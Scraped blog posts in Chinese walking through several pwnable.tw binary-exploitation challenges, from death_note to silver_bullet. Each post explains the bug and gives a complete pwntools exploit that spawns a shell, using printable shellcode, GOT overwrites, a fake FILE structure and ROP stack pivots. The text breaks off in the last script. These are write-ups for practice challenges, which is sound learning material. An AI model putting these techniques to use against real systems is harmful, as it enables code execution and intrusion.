这题还算简单，add时idx检查不严导致可以向上写got表，同时NX没开，因此我们先在heap里写shellcode，之后改puts_got执行shellcode。 但题目对输入的内容进行了限制： 1234567891011int __cdecl is_printable(char *s){ size_t i; // [esp+Ch] [ebp-Ch] for ( i = 0; strlen(s) &gt; i; ++i ) { if ( s[i] &lt;= 0x1F || s[i] == 0x7F ) return 0; } return 1;} 因此我们构造的shellcode要符合条件，也即可打印的shellcode。 由于限制，mov指令无法使用了，但可以通过push,pop来替代。最致命的时’int 0x80’没了😱 看了P4nda师傅的博客，学到了还可以用sub byte ptr[eax + 0x35] , dl;sub byte ptr[eax + 0x34] , dl这样的执行对机器码进行修改。 由于int 0x80的机器码为 cd 80 (16进制)，切在shellcode开始执行时edx存放shellcode首地址，因此构造eax=shellcode_addr,dl=0x60,之后再ptr[eax + 0x35]即shellcode结尾处写入’\\x6b\\x40’，通过执行改指令可以修正使其为0xcd和0x80，太妙了。 另外eax=0xb可以通过xor指令实现。 EXP: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *context.log_level='debug'def main(host,port=10201): global p if host: p=remote(host,port) else: p=process(&quot;./death_note&quot;) #eax=0xb,ebx=&quot;/bin/sh&quot;,ecx=edx=0 shellcode=''' push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx push edx pop eax push 0x60606060 pop edx sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x34] , dl push 0x3e3e3e3e pop edx sub byte ptr[eax + 0x34] , dl push ecx pop edx push edx pop eax xor al, 0x40 xor al, 0x4b push edx pop edx push edx pop edx ''' # gdb.attach(p,'b*0x80487EF') offset=-16 p.recvuntil(&quot;:&quot;) p.sendline(str(1)) p.recvuntil(&quot;:&quot;) p.sendline(str(offset)) p.recvuntil(&quot;:&quot;) p.send(asm(shellcode)+'\\x6b\\x40') p.interactive()if __name__ == '__main__': main(&quot;chall.pwnable.tw&quot;) 参考博文：(http://p4nda.top/2017/09/29/pwnable-tw-deathnote/)","link":"/2020/10/15/Pwnable_death_note/"},{"title":"Pwnable.tw dubblesort","text":"Pwnable.tw dubblesort 最近总是想写点东西，想来想去还是pwnable.tw上的题目值得记录，因此准备写个series，就从200分的dubblesort开始吧😝 32位的程序，题目名是dubblesort冒泡排序，先分析一波： 123__printf_chk(1, (int)&quot;What your name :&quot;); read(0, &amp;buf, 0x40u); __printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;); 开始的name输入到stack上，read没有’\\0’截断，因此可用来泄露栈里的数据，多为libc。 之后程序让我们输入sort number和number,这些数据都是存放在stack上的,然后执行sort()函数进行冒泡排序。 1234567891011121314151617181920__printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;);__isoc99_scanf(&quot;%u&quot;, &amp;v9);count = v9;if ( v9 ){ v4 = &amp;nums; v5 = 0; do { __printf_chk(1, (int)&quot;Enter the %d number : &quot;); fflush(stdout); __isoc99_scanf(&quot;%u&quot;, v4); ++v5; count = v9; ++v4; } while ( v9 &gt; v5 );}sort((unsigned int *)&amp;nums, count);puts(&quot;Result :&quot;); 由于输入的数量由我们控制，那就可以栈溢出了，难点在于程序开启了canary，因此我们要做的就是如何能够不改掉canary同时覆盖返回地址，并且在sort()后这些数据还能再对应的位置上(可能因为大小问题而被交换之类的)📍 在执行__isoc99_scanf(“%u”, v4);时，当我尝试输入一些非法的字符如’#’，由于”%u”表示接收数据格式为无符号的整形，因此视’#’为非法的字符，从而scanf执行失败，栈上对应的数据没有被修改，但也导致它留在了stdin里使得后面循环的scanf也无法正确执行，那有没有什么字符可以使得scanf视其为合法字符却不修改stack的数据呢? 网上查找一番了解到’+’和’-‘可以🎉。原因在于这两个符号用于定义正数和负数，当输入+4时会视为4，-4会视为无符号的0x100000000-4,因此当我们只输入’+’时，由于我们实际上什么也没输入，自然也就不会改写stack上的数据。 因此我们可以在canary前写入’0’,canary处写入’+’,cananry后面到ebp写str(0xf0000000)，ret_addr写system，然后写两个libc中’/bin/sh’的地址，这样构造的话sort()完其位置将不会因交换而改变（没有发生交换），从而能拿到flag🚩 EXP: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *DEBUG=0context.log_level='debug'if DEBUG: # r=process(&quot;./dubblesort&quot;,env={&quot;LD_PRELOAD&quot;:&quot;../libc_32.so.6&quot;}) p=process(&quot;./dubblesort&quot;) libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)else: p=remote(&quot;chall.pwnable.tw&quot;,10101) libc=ELF(&quot;../libc_32.so.6&quot;)# gdb.attach(p)# pause()got_plt_offset = 0x1b0000# leak libc addresspayload_1 = &quot;a&quot;*24p.recv()p.sendline(payload_1)libc_addr = u32(p.recv()[30:34])-0xalibc_address = libc_addr - got_plt_offset# libc_address=u32(p.recv(4))-0x1b3061info(&quot;libc: &quot;+hex(libc_address))# p.recvuntil('sort :')p.sendline(str(35))for _ in range(24): p.recvuntil(&quot;number : &quot;) p.sendline(str(0))p.recvuntil(&quot;number : &quot;)p.sendline('+')for _ in range(7): p.recvuntil(&quot;number : &quot;) p.sendline(str(0xf0000000))# gdb.attach(p)p.recvuntil(&quot;number : &quot;)p.sendline(str(libc.sym['system']+libc_address))p.recvuntil(&quot;number : &quot;)# p.sendline(str(libc.sym['system']+libc_address+1))p.sendline(str(libc_address+libc.search('/bin/sh').next()))p.recvuntil(&quot;number : &quot;)p.sendline(str(libc_address+libc.search('/bin/sh').next()))p.interactive()","link":"/2020/10/14/Pwnable_dubblesort/"},{"title":"Pwnable.tw hacknote","text":"Pwnable.tw hacknote 简单菜单题，提供了一种利用思路 程序的独特之处在于在malloc新堆之前会先malloc(8)（我就称它为lead）过来存放puts的函数指针和解下来malloc得到的ptr show()函数则是通过调用该位置的函数指针来进行打印 12345678910printf(&quot;Index :&quot;);read(0, &amp;buf, 4u);v1 = atoi(&amp;buf);if ( v1 &lt; 0 || v1 &gt;= numbers ){ puts(&quot;Out of bound!&quot;); _exit(0);}if ( ptr[v1] ) (*ptr[v1])(ptr[v1]); 显而易见，只要修改存在与堆上的函数指针为system，再show即可完成利用。程序还存在UAF，对我们来说是个好消息。 先利用堆分配得到chunk0对应的lead，改heap_ptr为printf_got，show(0)得到libc地址，然后同样方法得到lead，改puts的函数指针为system,heap_ptr为”||sh”,’||’用来于完成参数的截断，之后show拿到shell🚩 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level='debug'DEBUG=1if DEBUG: r=process(&quot;./hacknote&quot;) libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)else: r=remote(&quot;chall.pwnable.tw&quot;,10102) libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)elf=ELF(&quot;./hacknote&quot;)def add(sz,content): r.recvuntil(&quot;Your choice :&quot;) r.sendline('1') r.recvuntil(&quot;Note size :&quot;) r.sendline(str(sz)) r.recvuntil(&quot;Content :&quot;) r.send(content)def dele(idx): r.recvuntil(&quot;Your choice :&quot;) r.sendline('2') r.recvuntil(&quot;Index :&quot;) r.sendline(str(idx))def show(idx): r.recvuntil(&quot;Your choice :&quot;) r.sendline('3') r.recvuntil(&quot;Index :&quot;) r.sendline(str(idx))def pwn(): add(0x18,'a'*8) add(0x18,'a'*8) add(0x18,'a'*8) dele(0) dele(1) add(0x8,p32(0x0804862B)+p32(elf.got['printf'])) gdb.attach(r) show(0) libc_address=u32(r.recv(4))-libc.sym['printf'] system=libc_address+libc.sym['system'] binsh=libc_address+libc.search(&quot;/bin/sh&quot;).next() dele(2) dele(3) add(0x8,p32(system)+'||sh') show(0) r.interactive()if __name__ == '__main__': pwn() 200分的题相对容易点，后面就难起来了🌩","link":"/2020/10/17/Pwnable_hacknote/"},{"title":"Pwnable.tw re-alloc","text":"Pwmable.tw Re-alloc 利用思路挺新奇的，学到了学到了🤙 典型菜单题，但libc版本为2.29，意味着tecache里面0x8的位置会放入key指向tecache_struct，若要想double free，只能改掉key值。 add函数： 123456789101112131415161718192021222324252627282930printf(&quot;Index:&quot;); idx = read_long(); if ( idx &gt; 1 || heap[idx] ) { LODWORD(v0) = puts(&quot;Invalid !&quot;); } else { printf(&quot;Size:&quot;); size = read_long(); if ( size &lt;= 0x78 ) { v4 = realloc(0LL, size); if ( v4 ) { heap[idx] = v4; printf(&quot;Data:&quot;); v0 = (_BYTE *)(heap[idx] + read_input(heap[idx], size)); *v0 = 0; // off_by_one } else { LODWORD(v0) = puts(&quot;alloc error&quot;); } } else { LODWORD(v0) = puts(&quot;Too large!&quot;); } } 只允许申请两个函数，off_by_one感觉用不了了。 dele函数： 123456789101112printf(&quot;Index:&quot;);v2 = read_long();if ( v2 &gt; 1 ){ LODWORD(v0) = puts(&quot;Invalid !&quot;);}else{ realloc((void *)heap[v2], 0LL); v0 = heap; heap[v2] = 0LL;} 也没有野指针？ edit函数： 1234567891011121314printf(&quot;Index:&quot;);v1 = read_long();if ( v1 &gt; 1 || !heap[v1] ) return puts(&quot;Invalid !&quot;);printf(&quot;Size:&quot;);size = read_long();if ( size &gt; 0x78 ) return puts(&quot;Too large!&quot;);v3 = realloc((void *)heap[v1], size);if ( !v3 ) return puts(&quot;alloc error&quot;);heap[v1] = v3;printf(&quot;Data:&quot;);return read_input(heap[v1], size); 这一遍看下来发现都是利用realloc函数来完成各种操作，这里对realloc进行一个说明： realloc第一个参数为一个指针ptr，第二个参数为size。当ptr=NULL时相当于malloc(size)当ptr不为null，且size不为0时，先malloc(size)，再把ptr里的内容拷贝到新内存里（size大于old_size，扩容；size小于old_szie，切割）。当ptr不为null，size=0时，相当于free(ptr)。 因此可以想到edit函数里的realloc函数的size是由我们的输入决定的，如果size为0，则free(ptr)，形成UAF🎈 但还有一个问题在于没有show函数，而且只有2个能用的堆块是无法实现对stdout的劫持的。。 这道题提供了一个新的思路：改写atoll_got为printf_plt，构造fmt泄露。 由于atoll参数为&amp;buf，改为printf的话自然形成fmt，很妙。 那接下来就是漏洞利用了，先uaf改fd为atoll_got，之后add,这样chunk0=chunk1(0x20)，且tecache的0x20上残留了一个atoi_got的地址。然后edit chunk0为较大的size，并dele(0)，同时edit chunk1和chunk0相等的size，同时覆盖key(不然dele(1)时会报错)，之后dele(1),这样一个流程下来就使得即在0x20的tecache bin上留下地址，又清空了两个堆。 重复上面的流程使得在tecache的多个size链上留下atoll_got，方便后面的利用。 之后就是修改atoll_got为printf_plt(最好不要用0x20的那个atoll_got)，从而leak。 leak完后由于atoll被改成了printf，使得我们在add时的输入要有所变化，利用printf的返回值为输出的字符串长度，我们通过add(‘a’+’\\0’,’a’*0x10+’\\0’)来申请出0x20大小的tecache bin，改atoll_got为system拿到shell🚩 EXP: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *context.log_level='debug'DEBUG=1if DEBUG: # p=process(&quot;./re-alloc&quot;,env={&quot;LD_PRELOAD&quot;:'./libc.so'}) p=process([&quot;/home/an9ela/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/ld-2.29.so&quot;,&quot;./re-alloc&quot;],env={&quot;LD_PRELOAD&quot;:&quot;/home/an9ela/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so&quot;}) elf=ELF(&quot;./re-alloc&quot;) libc=ELF(&quot;./libc.so&quot;)else: p=remote(&quot;chall.pwnable.tw&quot;,10106) libc=ELF(&quot;./libc.so&quot;)def cmd(command): p.recvuntil(&quot;Your choice: &quot;) p.sendline(str(command))def add(idx,sz,data): cmd(1) p.recvuntil(&quot;Index:&quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size:&quot;) p.sendline(str(sz)) p.recvuntil(&quot;Data:&quot;) p.send(data)def edit(idx,sz,data): cmd(2) p.recvuntil(&quot;Index:&quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size:&quot;) p.sendline(str(sz)) if sz!=0: p.recvuntil(&quot;Data:&quot;) p.send(data)def dele(idx): cmd(3) p.recvuntil(&quot;Index:&quot;) p.sendline(str(idx))def pwn(): add(0,0x18,'a'*0x8) edit(0,0,'') edit(0,0x18,p64(0x404048)) add(1,0x18,'a'*0x8) edit(0,0x38,'a'*8) dele(0) edit(1,0x38,'b'*0x10) dele(1) add(0,0x48,'a'*0x8) edit(0,0,'') edit(0,0x48,p64(0x404048)) add(1,0x48,'a'*0x8) edit(0,0x58,'a'*8) dele(0) edit(1,0x58,'b'*0x10) dele(1) add(0,0x48,p64(0x00401070)) cmd(1) p.recvuntil(&quot;Index:&quot;) p.sendline('%p-%p+%p') p.recvuntil('+') libc.address=int(p.recv(14),16)-0x12e009 info(&quot;libc: &quot;+hex(libc.address)) cmd(1) p.recvuntil(&quot;:&quot;) p.sendline('a'+'\\x00') p.recvuntil(&quot;:&quot;) p.send('a'*15+'\\x00') p.recvuntil(&quot;Data:&quot;) p.send(p64(libc.sym['system'])) # add('a'+'\\x00','a'*0x48+'\\x00',p64(libc.sym['system'])) # add(3,0x20,p64(elf.got['printf'])) gdb.attach(p) cmd(3) p.recvuntil(&quot;Index:&quot;) p.sendline(&quot;/bin/sh\\x00&quot;) p.interactive()if __name__ == &quot;__main__&quot;: pwn()","link":"/2020/10/19/Pwnable_re-alloc/"},{"title":"Pwnable.tw seethefile","text":"Pwnable.tw seethefile 第二次做这道题了，搞懂了第一次做这题不懂的一些细节✈ 程序允许我们open_file,read_file,write_file，唯一发现的漏洞是在leave_massage的时候输入name可以覆写到bss上的fd. 12345678910111213case 5: printf(&quot;Leave your name :&quot;); __isoc99_scanf(&quot;%s&quot;, name); printf(&quot;Thank you %s ,see you next time\\n&quot;, name);.bss:0804B0C0 magicbuf db 1A0h dup(?) ; DATA XREF: openfile+33↑o.bss:0804B0C0 ; readfile+17↑o ....bss:0804B260 public name.bss:0804B260 name db 20h dup( ?) ; DATA XREF: main+9F↑o.bss:0804B260 ; main+B4↑o.bss:0804B280 ; FILE *fp.bss:0804B280 fp dd ? ; DATA XREF: openfile+6↑r.bss:0804B280 ; openfile+AD↑w ... 并且题目功能是在于对文件的操作，调用fread,fwrite,fopen,fclose，那这题就是考察io_file了。 对于io_file的利用，一般是直接覆盖vtable结构体指针指向可控的内存，再者就是构造整个io_file_plus结构体，但这种方法要求我们构造时要绕过一些检查。 1234567891011#define _IO_IS_FILEBUF 0x2000if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp);_IO_acquire_lock (fp);if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) status = _IO_file_close_it (fp);else status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;_IO_release_lock (fp);_IO_FINISH (fp); 我们要构造出_IO_IS_FILEBUF=0的_flags，使得可以绕过上面两个检测例如_flags=0xffffdfff（原理在于0xdf=(11011111),0x20=(0010000),0xdf&amp;0x20==0），最终执行_IO_FINISH (fp)； 在C语言中，成功调用fopen函数后会在堆上分配一块空间用于存放_IO_FILE_plus结构体，并且返回结构体的首地址，而在调用fclose时，最终会通过io_file_plus里的vatble调用相应的函数。 123456789101112131415161718192021222324252627282930313233343536pwndbg&gt; telescope 0x9003008 8000:0000│ 0x9003008 ◂— 0x001:0004│ 0x900300c ◂— 0x16102:0008│ 0x9003010 ◂— 0xfbad2488 //_flags03:000c│ 0x9003014 —▸ 0x900321d ◂— 0xa5d6f73 ('so]\\n') //io_read_ptr04:0010│ 0x9003018 —▸ 0x90033aa ◂— 0x31203130 ('01 1') //io_read_end05:0014│ 0x900301c —▸ 0x9003170 ◂— 0x30303030 ('0000') //io_read_base... ↓0a:0028│ 0x9003030 —▸ 0x9003570 ◂— 0x00b:002c│ 0x9003034 ◂— 0x0... ↓0f:003c│ 0x9003044 —▸ 0xf7fa1cc0 (_IO_2_1_stderr_) ◂— 0xfbad2086 //_chain10:0040│ 0x9003048 ◂— 0x311:0044│ 0x900304c ◂— 0x0... ↓14:0050│ 0x9003058 —▸ 0x90030a8 ◂— 0x015:0054│ 0x900305c ◂— 0xffffffff... ↓17:005c│ 0x9003064 ◂— 0x018:0060│ 0x9003068 —▸ 0x90030b4 ◂— 0x019:0064│ 0x900306c ◂— 0x0... ↓1c:0070│ 0x9003078 ◂— 0xffffffff1d:0074│ 0x900307c ◂— 0x0... ↓27:009c│ 0x90030a4 —▸ 0xf7fa0ac0 (_IO_file_jumps) ◂— 0x0 //vatable28:00a0│ 0x90030a8 ◂— 0x0... ↓pwndbg&gt; telescope 0xf7fa0ac0 3000:0000│ 0xf7fa0ac0 (_IO_file_jumps) ◂— 0x0... ↓02:0008│ 0xf7fa0ac8 (_IO_file_jumps+8) —▸ 0xf7e57990 (_IO_file_finish) ◂— push ebx03:000c│ 0xf7fa0acc (_IO_file_jumps+12) —▸ 0xf7e583b0 (_IO_file_overflow) ◂— push edi04:0010│ 0xf7fa0ad0 (_IO_file_jumps+16) —▸ 0xf7e58150 (_IO_file_underflow) ◂— push ebp05:0014│ 0xf7fa0ad4 (_IO_file_jumps+20) —▸ 0xf7e59230 (_IO_default_uflow) ◂— push ebx06:0018│ 0xf7fa0ad8 (_IO_file_jumps+24) —▸ 0xf7e5a0c0 (_IO_default_pbackfail) ◂— push ebp 因此我们只要构造好_IO_FILE_plus结构体，并通过name的溢出改fd指向我们构造的_IO_FILE_plus结构体，再执行fclose即可完成利用。 首先要Leak，题目给了我们任意文件读的机会，因此我们可以通过读取**’/proc/self/maps’**（文件的内存信息存储于此）来得到libc地址。 接下来就是构造file_plus结构体，几处要点： 1.构造_flag=0xffffdfff，绕过检测去执行((struct IO_FILE_plus *)fp-&gt;vtable)-&gt;__finish(fp) 2.在fd指向内存的偏移为0x4位置写入’;$0’，;用来分隔命令。 3.io_file结构体大小为0x94，因此要填充满0x94。 4.vatble指针指向紧接着的file结构体的内存，方便后面的构造。 5.vtable结构体对应的__finish函数指针(第3个位置)写为system() fake_struct: 123456789pwndbg&gt; telescope 0x804b300 8000:0000│ eax 0x804b300 ◂— 0xffffdfff01:0004│ 0x804b304 ◂— 0x30243b /* ';$0' */02:0008│ 0x804b308 ◂— 0x0... ↓25:0094│ 0x804b394 —▸ 0x804b398 —▸ 0xf7e28db0 (system) ◂— sub esp, 0xc26:0098│ 0x804b398 —▸ 0xf7e28db0 (system) ◂— sub esp, 0xc... ↓29:00a4│ 0x804b3a4 ◂— 0x0 执行((struct IO_FILE_plus *)fp-&gt;vtable)-&gt;__finish(fp)相当于执行system(“xxx;$0”)得到shell🚩 EXP: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *context.log_level='debug'def cmd(command): p.recvuntil(&quot;Your choice :&quot;) p.sendline(str(command))def openfile(name): cmd(1) p.recvuntil('What do you want to see :') p.sendline(name)def readfile(): cmd(2)def writefile(): cmd(3)def closefile(): cmd(4)def leave(name): cmd(5) p.recvuntil(&quot;Leave your name :&quot;) p.sendline(name)def main(host,port=1234): global p if host: p=remote(host,port) else: p=process(&quot;./seethefile&quot;) openfile(&quot;/proc/self/maps&quot;) readfile() readfile() readfile() writefile() p.recvline() libc.address=int(p.recv(8),16)-0x1b4000+0x1000 success(&quot;libc : &quot;+hex(libc.address)) fake_struct=0x0804B300 payload='a'*0x20+p32(fake_struct) #fd-&gt;fake_struct payload+='a'*(fake_struct-0x0804B280-4) payload+='\\xff\\xdf\\xff\\xff;$0\\x00'.ljust(0x94, '\\x00') payload+=p32(fake_struct+0x98) payload+=p32(libc.sym['system'])*3 gdb.attach(p,'b*0x08048B0F') leave(payload) # gdb.attach(p) p.interactive()if __name__ == &quot;__main__&quot;: libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;) main(0) fclose部分源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344/* libio/iofclose.c */int_IO_new_fclose (_IO_FILE *fp){ int status;/*这里本来有个对版本进行检测的代码，根据FILE结构中_vtable_offset变量是否为0来判断，不为0则执行_IO_old_fclose*/ /* First unlink the stream. */ if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); // unlink即：将fp指向的FILE结构体从_IO_list_all的单向链表中取下 _IO_acquire_lock (fp); if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) status = _IO_file_close_it (fp); //关闭fp else status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0; _IO_release_lock (fp); _IO_FINISH (fp); if (fp-&gt;_mode &gt; 0) {#if _LIBC /* This stream has a wide orientation. This means we have to free the conversion functions. */ struct _IO_codecvt *cc = fp-&gt;_codecvt; __libc_lock_lock (__gconv_lock); __gconv_release_step (cc-&gt;__cd_in.__cd.__steps); __gconv_release_step (cc-&gt;__cd_out.__cd.__steps); __libc_lock_unlock (__gconv_lock);#endif } else { if (_IO_have_backup (fp)) _IO_free_backup_area (fp); } if (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr) { fp-&gt;_IO_file_flags = 0; free(fp); } return status;} 参考博文:(https://www.jianshu.com/p/0176ebe02354)","link":"/2020/10/18/Pwnable_seethefile/"},{"title":"Pwnable.tw silver_bullet","text":"Pwnable.tw silver_bullet 好久之前做过一次，当时不怎么会调，栈构造的乱七八糟的，现在再来做感觉还是有点东西的😂 这题大概流程就是先create_bullet，再增加power，最后去挑战boss(HP=0x7f000000),成功就退出了，啊这 程序的漏洞点在power_up： 12345678910111213141516171819int __cdecl power_up(char *dest){ char s; // [esp+0h] [ebp-34h] size_t v3; // [esp+30h] [ebp-4h] v3 = 0; memset(&amp;s, 0, 0x30u); //这里的dest是就是我所说的main函数s，而这里的s只是这个函数的局部变量。 if ( !*dest ) return puts(&quot;You need create the bullet first !&quot;); if ( *((_DWORD *)dest + 0xC) &gt; 47u ) return puts(&quot;You can't power up any more !&quot;); printf(&quot;Give me your another description of bullet :&quot;); read_input(&amp;s, 0x30 - *((_DWORD *)dest + 12)); strncat(dest, &amp;s, 48 - *((_DWORD *)dest + 12)); v3 = strlen(&amp;s) + *((_DWORD *)dest + 12); printf(&quot;Your new power is : %u\\n&quot;, v3); *((_DWORD *)dest + 12) = v3; return puts(&quot;Enjoy it !&quot;);} strncat函数在执行完拼接后会在末尾加上一个\\0，如果我们先创造47个bullet然后再powe_up一个，那在strncat的时候就会在s+0x30的位置写入一个字节的\\0，导致之前存放在这里的size数据被覆盖为0，然后再之后的strlen(&amp;s) + *((_DWORD *)dest + 12)计算的结果就是1了。 从而我们有了继续向下拼接的机会，在之后的拼接会在s+0x30开始我们可以先伪造size大于0x7fffffff，然后就到了ebp的位置，伪造ebp为bss地址，返回地址用puts_plt覆盖，接下来写进去pop_ebx——ret作为puts的返回地址来清理栈并接着ret，之后写puts函数的参数为puts_got，然后写入input_read的地址，使得在pop_ebx_ret时去执行read_inputs，接下来设置read的参数为上面的bss的段和输入的size（够用就行），之后返回地址写成leave_ret使得两次leave把栈迁移到bss去执行我们input_read输入的system。 拼接的效果如下： 12345678910111215:0054│ eax 0xffddc584 ◂— 0x61616161 ('aaaa')... ↓20:0080│ 0xffddc5b0 ◂— 0x62616161 ('aaab')21:0084│ 0xffddc5b4 ◂— 0xffffff01 --&gt;size22:0088│ 0xffddc5b8 —▸ 0x804b410 ◂— 0x0 --&gt;bss23:008c│ 0xffddc5bc —▸ 0x80484a8 ◂— jmp dword ptr [0x804afdc] --&gt;ret_addr24:0090│ 0xffddc5c0 —▸ 0x8048475 (_init+33) ◂— pop ebx --&gt;pop_ret25:0094│ 0xffddc5c4 —▸ 0x804afdc (_GLOBAL_OFFSET_TABLE_+24) —▸ 0xf7d88cb0 (puts) ◂— push ebp26:0098│ edx-1 0xffddc5c8 —▸ 0x80485eb (read_input) ◂— push ebp27:009c│ 0xffddc5cc —▸ 0x8048a18 (main+196) ◂— leave28:00a0│ 0xffddc5d0 —▸ 0x804b410 ◂— 0x029:00a4│ 0xffddc5d4 ◂— 0x1011 之后执行beats获胜，main函数将执行返回 123456789101112131415161718192021222324252627282930313233EAX 0x0 EBX 0x0 ECX 0xffffffff EDX 0xf7fa0870 (_IO_stdfile_1_lock) ◂— 0x0 EDI 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0 ESI 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0 EBP 0x804b410 ◂— 0x0 ESP 0xffb8d030 —▸ 0x8048475 (_init+33) ◂— pop ebx EIP 0xf7e4bcb0 (puts) ◂— push ebp────────────────────────────────────────[ DISASM ]───────────────────────────────────────── 0x80489db &lt;main+135&gt; mov eax, 0 0x80489e0 &lt;main+140&gt; jmp main+196 &lt;0x8048a18&gt; ↓ 0x8048a18 &lt;main+196&gt; leave 0x8048a19 &lt;main+197&gt; ret ↓ 0x80484a8 jmp dword ptr [0x804afdc] &lt;0xf7e4bcb0&gt; ↓ ► 0xf7e4bcb0 &lt;puts&gt; push ebp 0xf7e4bcb1 &lt;puts+1&gt; mov ebp, esp 0xf7e4bcb3 &lt;puts+3&gt; push edi 0xf7e4bcb4 &lt;puts+4&gt; push esi 0xf7e4bcb5 &lt;puts+5&gt; push ebx 0xf7e4bcb6 &lt;puts+6&gt; call __x86.get_pc_thunk.bx &lt;0xf7f0bc55&gt;─────────────────────────────────────────[ STACK ]─────────────────────────────────────────00:0000│ esp 0xffb8d030 —▸ 0x8048475 (_init+33) ◂— pop ebx01:0004│ 0xffb8d034 —▸ 0x804afdc (_GLOBAL_OFFSET_TABLE_+24) —▸ 0xf7e4bcb0 (puts) ◂— push ebp02:0008│ 0xffb8d038 —▸ 0x80485eb (read_input) ◂— push ebp03:000c│ 0xffb8d03c —▸ 0x8048a18 (main+196) ◂— leave04:0010│ 0xffb8d040 —▸ 0x804b410 ◂— 0x005:0014│ 0xffb8d044 ◂— 0x101106:0018│ 0xffb8d048 —▸ 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db007:001c│ 0xffb8d04c —▸ 0xf7fe7c04 ◂— 0x0 先执行puts(puts_got) leak后返回到pop_rbx_ret清理stack并跳到read_input 12345678910111213141516171819202122232425262728EAX 0x5EBX 0x804afdc (_GLOBAL_OFFSET_TABLE_+24) —▸ 0xf7e4bcb0 (puts) ◂— push ebpECX 0xffffffffEDX 0xf7fa0870 (_IO_stdfile_1_lock) ◂— 0x0EDI 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0ESI 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0EBP 0x804b410 ◂— 0x0ESP 0xffb8d03c —▸ 0x8048a18 (main+196) ◂— leaveEIP 0x80485eb (read_input) ◂— push ebp────────────────────────────────────────[ DISASM ]───────────────────────────────────────── 0x8048475 &lt;_init+33&gt; pop ebx 0x8048476 &lt;_init+34&gt; ret ↓► 0x80485eb &lt;read_input&gt; push ebp 0x80485ec &lt;read_input+1&gt; mov ebp, esp 0x80485ee &lt;read_input+3&gt; sub esp, 4 0x80485f1 &lt;read_input+6&gt; push dword ptr [ebp + 0xc] 0x80485f4 &lt;read_input+9&gt; push dword ptr [ebp + 8] 0x80485f7 &lt;read_input+12&gt; push 0 0x80485f9 &lt;read_input+14&gt; call 0x8048490 0x80485fe &lt;read_input+19&gt; add esp, 0xc 0x8048601 &lt;read_input+22&gt; mov dword ptr [ebp - 4], eax─────────────────────────────────────────[ STACK ]─────────────────────────────────────────00:0000│ esp 0xffb8d03c —▸ 0x8048a18 (main+196) ◂— leave01:0004│ 0xffb8d040 —▸ 0x804b410 ◂— 0x002:0008│ 0xffb8d044 ◂— 0x1011 完成向0x804b410输入payload后进行栈迁移： 1234567891011121314151617181920212223242526272829303132EAX 0x17 EBX 0x804afdc (_GLOBAL_OFFSET_TABLE_+24) —▸ 0xf7e4bcb0 (puts) ◂— push ebp ECX 0x804b410 ◂— 0x61616161 ('aaaa') EDX 0x16 EDI 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0 ESI 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0 EBP 0x61616161 ('aaaa') ESP 0x804b414 —▸ 0xf7e26db0 (system) ◂— sub esp, 0xc EIP 0x8048a19 (main+197) ◂— ret────────────────────────────────────────[ DISASM ]───────────────────────────────────────── 0x804862e &lt;read_input+67&gt; jne read_input+83 &lt;0x804863e&gt; ↓ 0x804863e &lt;read_input+83&gt; mov eax, dword ptr [ebp - 4] 0x8048641 &lt;read_input+86&gt; leave 0x8048642 &lt;read_input+87&gt; ret ↓ 0x8048a18 &lt;main+196&gt; leave ► 0x8048a19 &lt;main+197&gt; ret &lt;0xf7e26db0; system&gt; ↓ 0xf7e26db0 &lt;system&gt; sub esp, 0xc 0xf7e26db3 &lt;system+3&gt; mov eax, dword ptr [esp + 0x10] 0xf7e26db7 &lt;system+7&gt; call __x86.get_pc_thunk.dx &lt;0xf7f0bc5d&gt; 0xf7e26dbc &lt;system+12&gt; add edx, 0x178244 0xf7e26dc2 &lt;system+18&gt; test eax, eax─────────────────────────────────────────[ STACK ]─────────────────────────────────────────00:0000│ esp 0x804b414 —▸ 0xf7e26db0 (system) ◂— sub esp, 0xc01:0004│ 0x804b418 ◂— 0xdeadbeef02:0008│ 0x804b41c —▸ 0x804b420 ◂— '/bin/sh'03:000c│ 0x804b420 ◂— '/bin/sh'04:0010│ 0x804b424 ◂— 0x68732f /* '/sh' */05:0014│ 0x804b428 ◂— 0x0 leave_ret两次完成栈迁移,执行payload！！🚩 EXP： 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *context.log_level='debug'debug = 1if debug: p = process('./silver_bullet') libc = 